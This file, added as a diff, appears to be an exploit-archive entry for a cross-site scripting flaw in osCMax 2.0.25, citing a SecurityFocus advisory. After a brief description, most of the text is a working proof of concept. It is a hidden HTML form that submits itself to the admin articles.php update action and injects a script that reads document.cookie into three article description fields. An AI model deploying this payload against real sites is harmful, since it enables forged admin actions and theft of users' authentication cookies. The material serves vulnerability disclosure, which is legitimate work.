@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/40998/info
+
+osCmax is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+osCMax 2.0.25 is vulnerable; other versions may also be affected.
+
+<form action="http://www.example.com/admin/articles.php?tPath=1&aID=1&action=update_article" method="post" name="main" enctype="multipart/form-data" >
+<input type="hidden" name="articles_status" value="1" />
+<input type="hidden" name="articles_date_available" value="2010-06-04" />
+<input type="hidden" name="authors_id" value="" />
+<input type="hidden" name="articles_date_added" value="2010-06-04 00:00:00" />
+<input type="hidden" name="x" value="1" />
+<input type="hidden" name="y" value="2" />
+
+<input type="hidden" name="articles_name[1]" value="article name" />
+<input type="hidden" name="articles_description[1]" value='content"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="articles_url[1]" value="" />
+<input type="hidden" name="articles_head_title_tag[1]" value="article title" />
+<input type="hidden" name="articles_head_desc_tag[1]" value="" />
+<input type="hidden" name="articles_head_keywords_tag[1]" value="" />
+
+<input type="hidden" name="articles_name[2]" value="article name" />
+<input type="hidden" name="articles_description[2]" value='content"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="articles_url[2]" value="" />
+<input type="hidden" name="articles_head_title_tag[2]" value="article title" />
+<input type="hidden" name="articles_head_desc_tag[2]" value="" />
+<input type="hidden" name="articles_head_keywords_tag[2]" value="" />
+
+<input type="hidden" name="articles_name[3]" value="article name" />
+<input type="hidden" name="articles_description[3]" value='content"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="articles_url[3]" value="" />
+<input type="hidden" name="articles_head_title_tag[3]" value="article title" />
+<input type="hidden" name="articles_head_desc_tag[3]" value="" />
+<input type="hidden" name="articles_head_keywords_tag[3]" value="" />
+
+<input type="hidden" name="x" value="3" />
+<input type="hidden" name="y" value="4" />
+
+</form>
+<script>
+document.main.submit();
+</script>
